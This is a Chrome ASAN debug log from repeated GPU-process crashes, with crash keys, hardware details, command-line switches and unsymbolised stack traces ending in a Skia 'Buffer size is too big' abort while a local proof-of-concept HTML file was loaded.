aafa13,bb199083-3f4a17df,5e2ea1a-3f4a17df,198413d6-3f4a17df,5870a003-3f4a17df,8e8365ea-3f4a17df,b1c4d90f-3a905610,3797f84b-3f4a17df,52a20523-3f4a17df,ef4764d7-88fcaf7d,2bac45ad-3f4a17df,613081e8-3f4a17df,daa70516-3f4a17df,c49d2b35-3f4a17df,377002b7-3f4a17df,c96dd907-3f4a17df,b360dba0-3f4a17df,404dfb1f-3f4a17df,94b88ba6-7e2e67c9,1fce7d57-3f4a17df,d59ff9fb-3f4a17df,b0f15b33-b0f15b33,f3dbf5bd-faff9ce0,cbe862f6-cbe862f6,a14eecea-3f4a17df,15607410-b6e8dbb7,ab917364-25c84d73,8018a043-3f4a17df,ad4acdda-3f4a17df,90860314-5ab828e2,b1ceb06f-3f4a17df,177e9e71-3f4a17df,a39574eb-16fff78e,f8b97b53-3f4a17df,72b751de-3f4a17df,db59f83a-3f4a17df,ec21b181-3f4a17df,80b60e4a-3f4a17df,e2cf7bc1-3f4a17df,c1e0d32e-3f4a17df,f585af0a-3f4a17df,bea4a9c2-750ef675,74d4bce7-3d47f4f4,31307d07-3f4a17df,5fd6ae8b-3f4a17df,2f6246c2-3f4a17df,e1933810-8b05fe37,45e0e828-3f4a17df,1ddbf293-3f4a17df,51d22fd4-3f4a17df,aa8204ea-3f4a17df,5e19e3dc-f800d222,2a2ebc2c-3f4a17df,17073ac-e5311237,6332ffaf-3f4a17df,5910121-3f4a17df,f9a6f6e9-3f4a17df,595f5eb0-f23d1dea,7b4be1f2-3d47f4f4,9cdd2223-3f4a17df,bef5c006-3f4a17df,c5be9d88-3f4a17df,39a2e568-3f4a17df,ea6b5a9c-3f4a17df,e0e211ad-e0e211ad,2f95a72f-3f4a17df,8abceefd-f7ec9f66,c55491ea-156838e5,d00bdbf9-3f4a17df,c21c2b8b-3d47f4f4,1caa3332-20af8ffe,f4f00e05-ca7d8d80,a983f698-8e9cac75,9481ce98-3d47f4f4,2a426c03-3d47f4f4,70678518-dee66fa8,be338734-4866ef6e,5f9907a9-206f6a6e,8eeccb9a-c35b209e,2b465683-206f6a6e,52fc7926-ee3d6169,bc9b361d-dee66fa8,a41a7188-b184655b,ff71bfdc-dee66fa8,251fc742-dee66fa8,2159dd0c-dee66fa8,e7cc79d5-dee66fa8,4b935545-bb2d3403,9a38bae3-3d47f4f4,2d1e43a3-3d47f4f4,"
  "num-experiments" = "347"
  "gr-context-type" = "GaneshGL"
  "vulkan-api-version" = "1.4.345"
  "egl-display-type" = "angle:OpenGL"
  "gpu-gl-renderer" = "ANGLE (AMD, AMD Radeon BAR PRO R9700 (radeonsi gfx1201 LLVM 20.1.2), OpenGL ES 3.2 Mesa 25.2.8-0ubuntu0.24.04.1)"
  "gpu-gl-vendor" = "Google Inc. (AMD)"
  "gpu-generation-intel" = "0"
  "gpu-vsver" = "3.00"
  "gpu-psver" = "3.00"
  "gpu-driver" = "25.2.8"
  "gpu_count" = "1"
  "gpu-devid" = "0x7551"
  "gpu-venid" = "0x1002"
  "chrome-trace-id" = "13231876131878362408"
  "reentry_guard_tls_slot" = "unused"
  "switch-15" = "--trace-process-track-uuid=3190708993808206286"
  "switch-14" = "--pseudonymization-salt-handle=7,i,7050076991723637085,127792482"
  "switch-13" = "--variations-seed-version"
  "switch-12" = "--field-trial-handle=3,i,16897643971091495548,149345454614322515"
  "switch-11" = "--metrics-shmem-handle=4,i,14784110375961382707,1837131870068498"
  "switch-10" = "--shared-files"
  "switch-9" = "--change-stack-guard-on-fork=enable"
  "switch-8" = "--disable-breakpad"
  "switch-7" = "--enable-crash-reporter=,"
  "switch-6" = "--crashpad-handler-pid=496847"
  "commandline-disabled-feature-1" = "EyeDropper"
  "osarch" = "x86_64"
  "pid" = "497231"
  "ptype" = "gpu-process"
  "switch-5" = "--render-node-override=/dev/dri/renderD128"
  "switch-4" = "--ozone-platform=wayland"
  "switch-3" = "--disable-skia-graphite"
  "switch-2" = "--enable-gpu-rasterization"
  "switch-1" = "--no-sandbox"
  "num-switches" = "18"

Received signal 6
#0 0x5965097bc9f6 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x10edc9f5)
#1 0x5965211ef198 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2890f197)
#2 0x5965211acc57 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x288ccc56)
#3 0x5965211ee59f (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2890e59e)
#4 0x758cdb245330 (/usr/lib/x86_64-linux-gnu/libc.so.6+0x4532f)
#5 0x758cdb29eb2c (/usr/lib/x86_64-linux-gnu/libc.so.6+0x9eb2b)
#6 0x758cdb24527e (/usr/lib/x86_64-linux-gnu/libc.so.6+0x4527d)
#7 0x758cdb2288ff (/usr/lib/x86_64-linux-gnu/libc.so.6+0x288fe)
#8 0x596520eb8522 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x285d8521)
#9 0x596520eb79fd (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x285d79fc)
#10 0x596520eb6970 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x285d696f)
#11 0x596523084a6b (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2a7a4a6a)
#12 0x596523365a3f (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa85a3e)
#13 0x59652336676e (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa8676d)
#14 0x5965233682d5 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa882d4)
#15 0x59652336768f (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa8768e)
#16 0x596523369ac9 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa89ac8)
#17 0x5965235e312a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2ad03129)
#18 0x5965235df0d1 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2acff0d0)
#19 0x596523594163 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2acb4162)
#20 0x5965235d301b (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2acf301a)
#21 0x5965233bef8b (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aadef8a)
#22 0x59652335972c (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa7972b)
#23 0x596523357bd4 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa77bd3)
#24 0x59652335ab91 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa7ab90)
#25 0x59652335335a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa73359)
#26 0x59652341df27 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2ab3df26)
#27 0x59652341b915 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2ab3b914)
#28 0x59652341f0c6 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2ab3f0c5)
#29 0x5965232f7a92 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa17a91)
#30 0x5965232f5c27 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa15c26)
#31 0x5965232f6196 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa16195)
#32 0x59652ad35f32 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x32455f31)
#33 0x59652ad10899 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x32430898)
#34 0x59652a5d8d10 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31cf8d0f)
#35 0x59652ae44d7a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x32564d79)
#36 0x59652ae43867 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x32563866)
#37 0x59652a5b8254 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31cd8253)
#38 0x59652a5c6448 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31ce6447)
#39 0x59652a5c622a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31ce6229)
#40 0x596514506202 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bc26201)
#41 0x5965144da948 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbfa947)
#42 0x5965144d8979 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbf8978)
#43 0x5965144dc562 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbfc561)
#44 0x596521023ad7 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x28743ad6)
#45 0x59652109b28a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x287bb289)
#46 0x59652109a0fb (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x287ba0fa)
#47 0x596520ee32c8 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x286032c7)
#48 0x59652109c998 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x287bc997)
#49 0x596520f9f071 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x286bf070)
#50 0x59652c9408bd (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x340608bc)
#51 0x59651ccaa710 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243ca70f)
#52 0x59651ccaba40 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243cba3f)
#53 0x59651ccae749 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243ce748)
#54 0x59651cca8122 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243c8121)
#55 0x59651cca871d (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243c871c)
#56 0x59650984fb3a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x10f6fb39)
#57 0x758cdb22a1ca (/usr/lib/x86_64-linux-gnu/libc.so.6+0x2a1c9)
#58 0x758cdb22a28b (/usr/lib/x86_64-linux-gnu/libc.so.6+0x2a28a)
#59 0x59650977502a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x10e95029)
  r8: 00005965420dbff0  r9: 00007fffffffff01 r10: 0000000000000008 r11: 0000000000000246
 r12: 0000000000000006 r13: 0000718cd8c012f0 r14: 0000000000000016 r15: 0000718cd8a65000
  di: 000000000007964f  si: 000000000007964f  bp: 00007ffc98d84930  bx: 000000000007964f
  dx: 0000000000000006  ax: 0000000000000000  cx: 0000758cdb29eb2c  sp: 00007ffc98d848f0
  ip: 0000758cdb29eb2c efl: 0000000000000246 cgf: 002b000000000033 erf: 0000000000000000
 trp: 0000000000000000 msk: 0000000000000000 cr2: 0000000000000000
[end of stack trace]
[496833:496833:0310/013843.004477:ERROR:content/browser/gpu/gpu_process_host.cc:999] GPU process exited unexpectedly: exit_code=6
WARNING: radv is not a conformant Vulkan implementation, testing use only.
[497566:497566:0310/013843.405759:ERROR:ui/ozone/platform/wayland/gpu/wayland_surface_factory.cc:252] '--ozone-platform=wayland' is not compatible with Vulkan. Consider switching to '--ozone-platform=x11' or disabling Vulkan
WARNING: radv is not a conformant Vulkan implementation, testing use only.
[497566:497566:0310/013852.145901:FATAL:third_party/skia/src/gpu/ganesh/GrCpuBuffer.h:27] Buffer size is too big.
#0 0x5965097bc9f6 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x10edc9f5)
#1 0x5965211ef198 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2890f197)
#2 0x5965211acc57 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x288ccc56)
#3 0x596520eb6e05 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x285d6e04)
#4 0x596520eb6970 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x285d696f)
#5 0x596523084a6b (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2a7a4a6a)
#6 0x596523365a3f (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa85a3e)
#7 0x59652336676e (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa8676d)
#8 0x5965233682d5 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa882d4)
#9 0x59652336768f (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa8768e)
#10 0x596523369ac9 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa89ac8)
#11 0x5965235e312a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2ad03129)
#12 0x5965235df0d1 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2acff0d0)
#13 0x596523594163 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2acb4162)
#14 0x5965235d301b (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2acf301a)
#15 0x5965233bef8b (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aadef8a)
#16 0x59652335972c (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa7972b)
#17 0x596523357bd4 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa77bd3)
#18 0x59652335ab91 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa7ab90)
#19 0x59652335335a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa73359)
#20 0x59652341df27 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2ab3df26)
#21 0x59652341b915 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2ab3b914)
#22 0x59652341f0c6 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2ab3f0c5)
#23 0x5965232f7a92 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa17a91)
#24 0x5965232f5c27 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa15c26)
#25 0x5965232f6196 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa16195)
#26 0x59652ad35f32 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x32455f31)
#27 0x59652ad10899 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x32430898)
#28 0x59652a5d8d10 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31cf8d0f)
#29 0x59652ae44d7a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x32564d79)
#30 0x59652ae43867 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x32563866)
#31 0x59652a5b8254 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31cd8253)
#32 0x59652a5c6448 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31ce6447)
#33 0x59652a5c622a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31ce6229)
#34 0x596514506202 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bc26201)
#35 0x5965144da948 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbfa947)
#36 0x5965144d8979 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbf8978)
#37 0x5965144dc562 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbfc561)
#38 0x596521023ad7 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x28743ad6)
#39 0x59652109b28a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x287bb289)
#40 0x59652109a0fb (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x287ba0fa)
#41 0x596520ee32c8 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x286032c7)
#42 0x59652109c998 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x287bc997)
#43 0x596520f9f071 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x286bf070)
#44 0x59652c9408bd (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x340608bc)
#45 0x59651ccaa710 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243ca70f)
#46 0x59651ccaba40 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243cba3f)
#47 0x59651ccae749 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243ce748)
#48 0x59651cca8122 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243c8121)
#49 0x59651cca871d (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243c871c)
#50 0x59650984fb3a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x10f6fb39)
#51 0x758cdb22a1ca (/usr/lib/x86_64-linux-gnu/libc.so.6+0x2a1c9)
#52 0x758cdb22a28b (/usr/lib/x86_64-linux-gnu/libc.so.6+0x2a28a)
#53 0x59650977502a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x10e95029)
Task trace:
#0 0x5965144d8e53 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbf8e52)
#1 0x5965144d8e53 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbf8e52)
#2 0x5965144d8e53 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbf8e52)
#3 0x5965144d8e53 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbf8e52)
#4 0x5965144d8e53 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbf8e52)
Task trace buffer limit hit, update PendingTask::kTaskBacktraceLength to increase.
Crash keys:
  "gpu-url-chunk" = "file:///home/FOO/sec/chromium/src/skia_poc/atlas_path_positive_wrap_poc.html"
  "gpu-gl-context-is-virtual" = "0"
  "vulkan-device-name" = "AMD Radeon BAR PRO R9700 (RADV GFX1201)"
  "vulkan-device-type" = "discrete"
  "vulkan-device-id" = "0x7551"
  "vulkan-device-vendor-id" = "0x1002"
  "vulkan-device-driver-version" = "25.2.8"
  "vulkan-device-api-version" = "1.4.318"
  "variations" = "1db03297-3f4a17df,b1755f03-e38596b7,6f27bc8a-3f4a17df,c203d55b-3f4a17df,cf16e290-b446100,a66dbd64-71c38a98,e32097a3-3f4a17df,102166ac-3f4a17df,89986dbe-3f01b610,b13ca3d9-84f6cff8,f2b6a878-3f4a17df,32806e4f-28ea5088,2468d6e5-3f4a17df,f5a1eb9a-3f4a17df,a66fd611-3f4a17df,decd384-3f4a17df,ac59e11a-3f4a17df,836f1ad3-3f4a17df,8f6c5cc6-3f4a17df,94e21eca-3f4a17df,d6284ba0-9610fd4e,73551ca1-3f4a17df,d6737162-3f4a17df,e35cc1a-3f4a17df,e5a1483c-3f4a17df,6a68c9a6-3f4a17df,c1531af3-3f4a17df,47a0a3b2-3f4a17df,17f1f5fe-3f4a17df,1b0dc97-3f4a17df,2c561bd6-3f4a17df,97063883-1f820d08,7b46cc51-3f4a17df,d4754f61-3f4a17df,af00e384-3f4a17df,8f80c10-78198108,a62c052e-3f4a17df,a4ca7cb1-3f4a17df,da968c94-3f4a17df,ae727645-d13781e7,e435811b-3f4a17df,f1d165c0-3f4a17df,ec937206-3f4a17df,5eb9e4fc-3f4a17df,cad2b12b-8ef57898,57d6085b-3f4a17df,fb92da45-3f4a17df,d6ad7f9a-a9080253,9507cc99-f2018abe,2940f5d3-3f4a17df,a5ecfb95-3f4a17df,797fe373-3f4a17df,ead3e59e-8c7df51c,a3b91d85-3f4a17df,17a43872-3f4a17df,1ffefb1a-3f4a17df,f419bc72-3f4a17df,470d37ba-3f4a17df,f7d06457-e9d42fcd,bcb58f65-3f4a17df,d512da3a-513c429d,54d601a5-3f4a17df,63f121e7-3f4a17df,98ab2bc2-b6dc7ce0,600d2fa6-3f4a17df,bca7ba0b-8cb78501,40355e18-3f4a17df,ff1e0777-3f4a17df,999e8980-6ec7edcb,b6083631-447a6f32,4dc2f223-3f4a17df,4a2d56fe-3f4a17df,5133eb43-307b98b1,2d36b960-a68c6def,f314f5b9-a2b13a7f,6e4a21fe-efc28565,531e1626-4513f3bf,820f17d2-e484eeec,40debc11-3f4a17df,12733ec4-3f4a17df,44666d99-3d47f4f4,e14ee5ee-c6d6098d,fd051c38-3f4a17df,a98def31-2a5a8f5d,284a13f5-3f4a17df,fc1790de-3f4a17df,35c106c9-3f4a17df,639ee5d3-3f4a17df,7dcaa2cd-3f4a17df,57d26b38-3f4a17df,f6f5c542-3f4a17df,5e05ef36-3f4a17df,18324944-3f4a17df,3779be93-3f4a17df,707ac2b5-3f4a17df,caf19648-74472b0b,3b02c079-3f4a17df,54b15be4-e3ec50a6,669a7db8-3f4a17df,68f499c8-d24710ce,350559e5-3f4a17df,91cba98-b3b3bb94,6a6ab26-faa329bf,c75c6bbe-3f4a17df,4eb998ce-3f4a17df,9d5ecd8d-ca7d8d80,a9776a9b-3f4a17df,3e15bfc6-3f4a17df,e3d19f5b-3f4a17df,3d9fe79-3f4a17df,af41f030-3f4a17df,4b781a51-23ee7c7b,2f4e13c7-3f4a17df,335ba8a6-79d4b4f6,8f4b3221-3f4a17df,779782d3-3f4a17df,e1d656a5-3f4a17df,e5c8270a-3f4a17df,ef3132a9-3f4a17df,3042ad4b-ad2fa222,87bc8a34-3f4a17df,96def758-3f4a17df,2d3e25b-3f4a17df,151258bf-3f4a17df,13e8c923-3f4a17df,3e672fd9-e109e63f,ae1581ef-35f6ea04,893cc7a4-3f4a17df,3c978b59-3f4a17df,9cf6c713-7585e9f1,4ab30a87-c9361ef3,78049c75-f7dfe51d,c297985a-3f4a17df,a3ce8da1-3f4a17df,22946be1-22946be1,6ddea229-6ddea229,e41e244a-3f4a17df,31f4a8bd-3f4a17df,d4daab79-3f4a17df,acf2401-ec6cb59a,96d006a-c3a49e71,f6264095-c3f8eab0,f42905ff-3f4a17df,2faf225b-3f4a17df,74be468c-3f4a17df,7d05570e-76a4e021,4fcb1c2f-3f4a17df,4146cc26-775f6248,e9844d40-3f4a17df,2b68be8f-3f4a17df,d1ae5bf4-3f4a17df,15d1b2d8-3f4a17df,7ca2dd7e-3f4a17df,8ac8acb3-3f4a17df,55cc39e1-3f4a17df,ba449693-695908d9,cad46b80-3f4a17df,70404afa-803f8fc4,fecdbadb-3f4a17df,8978ce4e-cf4f6ead,8643cb65-cf4f6ead,e6ed801e-cf4f6ead,ff7d412f-3f4a17df,fc9ceed7-ee2a48b4,89a375de-3f4a17df,4af38a69-3c635604,6ff79bbe-3f4a17df,aaa52086-d50cce67,b0b97cfb-3f4a17df,c823d1e9-3d47f4f4,66657049-3f4a17df,36860c1b-3f4a17df,7262ef2c-140d00b2,f93c9364-3f4a17df,b4c2bd17-23db2647,6ec84df5-3f4a17df,b86bee04-3f4a17df,9e5c75f1-30e1b12b,4d625646-3f4a17df,ec3153de-3f4a17df,2394f90f-ecc8f8cf,d5f746a4-39aaf314,56aa5797-e5fec5a6,54be7848-3f4a17df,e2d38844-3f4a17df,5c131b25-3f4a17df,eef5d69a-1dca273f,da493d3c-3f4a17df,72bafd3e-cdb4c186,f659c5ca-3f4a17df,f3ed486d-3f4a17df,81c84cff-6154888c,b3c54bb3-88fcaf7d,4076100b-3f4a17df,8c162025-3d47f4f4,9f8a0fd2-b4a3cd0c,ffdf4988-3f4a17df,3d3963fc-5d65cee9,3ac9fcb9-3f4a17df,b446c562-3f4a17df,63831cab-3f4a17df,d2a642a0-3f4a17df,7ece8311-3f4a17df,7a32e64e-3f4a17df,8579ead7-3f4a17df,f108c955-3f4a17df,10713630-3f4a17df,b76b514f-3ac589b9,8f418b04-299bae22,d3566fbd-c6f74b94,147e9ecd-3f4a17df,d06639a1-3f4a17df,ed2195eb-3f4a17df,de028327-70abd7a5,2ca06d17-3f4a17df,a2f28ef8-d7d235fa,5abe5347-3f4a17df,35a386c3-3f4a17df,45a2f2f-f9e1b5a8,d5ce1427-3f4a17df,afeeb5d0-3f4a17df,186d6e2c-36c0e608,6cc45990-3f4a17df,951dcd0c-3f4a17df,4ea303a6-ecbb250e,ab7eb98c-3f4a17df,258151b3-3f4a17df,4fa4e3b8-3f4a17df,44fe0078-3f4a17df,c92d2cc4-3f4a17df,2468be5e-5f6398dc,aa540f4f-3f4a17df,30cf4980-61673e6,9850104b-395bafa,19e446cd-3f4a17df,f613598-3f4a17df,f3b6291d-7fa80c0f,bf46f37a-3f4a17df,40de0170-3f4a17df,5c78b732-3f4a17df,2d2b187a-3f4a17df,f86bc1e2-3f4a17df,8ec87690-6aac4626,e6ec9393-3f4a17df,ea0d881d-fd860968,3f752d-3f4a17df,25a81d51-3f4a17df,d0fa45e6-3f4a17df,53c64de7-3f4a17df,e3559213-c0f46cd5,89bba52e-174ae9a8,444b9649-3f4a17df,d990c4ac-3f4a17df,a374fdf0-964ff297,59eb375d-3f4a17df,23226e84-65aafa13,bb199083-3f4a17df,5e2ea1a-3f4a17df,198413d6-3f4a17df,5870a003-3f4a17df,8e8365ea-3f4a17df,b1c4d90f-3a905610,3797f84b-3f4a17df,52a20523-3f4a17df,ef4764d7-88fcaf7d,2bac45ad-3f4a17df,613081e8-3f4a17df,daa70516-3f4a17df,c49d2b35-3f4a17df,377002b7-3f4a17df,c96dd907-3f4a17df,b360dba0-3f4a17df,404dfb1f-3f4a17df,94b88ba6-7e2e67c9,1fce7d57-3f4a17df,d59ff9fb-3f4a17df,b0f15b33-b0f15b33,f3dbf5bd-faff9ce0,cbe862f6-cbe862f6,a14eecea-3f4a17df,15607410-b6e8dbb7,ab917364-25c84d73,8018a043-3f4a17df,ad4acdda-3f4a17df,90860314-5ab828e2,b1ceb06f-3f4a17df,177e9e71-3f4a17df,a39574eb-16fff78e,f8b97b53-3f4a17df,72b751de-3f4a17df,db59f83a-3f4a17df,ec21b181-3f4a17df,80b60e4a-3f4a17df,e2cf7bc1-3f4a17df,c1e0d32e-3f4a17df,f585af0a-3f4a17df,bea4a9c2-750ef675,74d4bce7-3d47f4f4,31307d07-3f4a17df,5fd6ae8b-3f4a17df,2f6246c2-3f4a17df,e1933810-8b05fe37,45e0e828-3f4a17df,1ddbf293-3f4a17df,51d22fd4-3f4a17df,aa8204ea-3f4a17df,5e19e3dc-f800d222,2a2ebc2c-3f4a17df,17073ac-e5311237,6332ffaf-3f4a17df,5910121-3f4a17df,f9a6f6e9-3f4a17df,595f5eb0-f23d1dea,7b4be1f2-3d47f4f4,9cdd2223-3f4a17df,bef5c006-3f4a17df,c5be9d88-3f4a17df,39a2e568-3f4a17df,ea6b5a9c-3f4a17df,e0e211ad-e0e211ad,2f95a72f-3f4a17df,8abceefd-f7ec9f66,c55491ea-156838e5,d00bdbf9-3f4a17df,c21c2b8b-3d47f4f4,1caa3332-20af8ffe,f4f00e05-ca7d8d80,a983f698-8e9cac75,9481ce98-3d47f4f4,2a426c03-3d47f4f4,70678518-dee66fa8,be338734-4866ef6e,5f9907a9-206f6a6e,8eeccb9a-c35b209e,2b465683-206f6a6e,52fc7926-ee3d6169,bc9b361d-dee66fa8,a41a7188-b184655b,ff71bfdc-dee66fa8,251fc742-dee66fa8,2159dd0c-dee66fa8,e7cc79d5-dee66fa8,"
  "num-experiments" = "350"
  "gr-context-type" = "GaneshGL"
  "vulkan-api-version" = "1.4.345"
  "egl-display-type" = "angle:OpenGL"
  "gpu-gl-renderer" = "ANGLE (AMD, AMD Radeon BAR PRO R9700 (radeonsi gfx1201 LLVM 20.1.2), OpenGL ES 3.2 Mesa 25.2.8-0ubuntu0.24.04.1)"
  "gpu-gl-vendor" = "Google Inc. (AMD)"
  "gpu-generation-intel" = "0"
  "gpu-vsver" = "3.00"
  "gpu-psver" = "3.00"
  "gpu-driver" = "25.2.8"
  "gpu_count" = "1"
  "gpu-devid" = "0x7551"
  "gpu-venid" = "0x1002"
  "chrome-trace-id" = "2765414499570772274"
  "reentry_guard_tls_slot" = "unused"
  "switch-15" = "--trace-process-track-uuid=3190708994745248135"
  "switch-14" = "--pseudonymization-salt-handle=7,i,7050076991723637085,127792482"
  "switch-13" = "--variations-seed-version"
  "switch-12" = "--field-trial-handle=3,i,16897643971091495548,149345454614322515"
  "switch-11" = "--metrics-shmem-handle=4,i,2681035128284676225,14990810182722898"
  "switch-10" = "--shared-files"
  "switch-9" = "--change-stack-guard-on-fork=enable"
  "switch-8" = "--disable-breakpad"
  "switch-7" = "--enable-crash-reporter=,"
  "switch-6" = "--crashpad-handler-pid=496847"
  "commandline-disabled-feature-1" = "EyeDropper"
  "osarch" = "x86_64"
  "pid" = "497566"
  "ptype" = "gpu-process"
  "switch-5" = "--render-node-override=/dev/dri/renderD128"
  "switch-4" = "--ozone-platform=wayland"
  "switch-3" = "--disable-skia-graphite"
  "switch-2" = "--enable-gpu-rasterization"
  "switch-1" = "--no-sandbox"
  "num-switches" = "18"

Received signal 6
#0 0x5965097bc9f6 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x10edc9f5)
#1 0x5965211ef198 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2890f197)
#2 0x5965211acc57 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x288ccc56)
#3 0x5965211ee59f (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2890e59e)
#4 0x758cdb245330 (/usr/lib/x86_64-linux-gnu/libc.so.6+0x4532f)
#5 0x758cdb29eb2c (/usr/lib/x86_64-linux-gnu/libc.so.6+0x9eb2b)
#6 0x758cdb24527e (/usr/lib/x86_64-linux-gnu/libc.so.6+0x4527d)
#7 0x758cdb2288ff (/usr/lib/x86_64-linux-gnu/libc.so.6+0x288fe)
#8 0x596520eb8522 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x285d8521)
#9 0x596520eb79fd (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x285d79fc)
#10 0x596520eb6970 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x285d696f)
#11 0x596523084a6b (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2a7a4a6a)
#12 0x596523365a3f (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa85a3e)
#13 0x59652336676e (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa8676d)
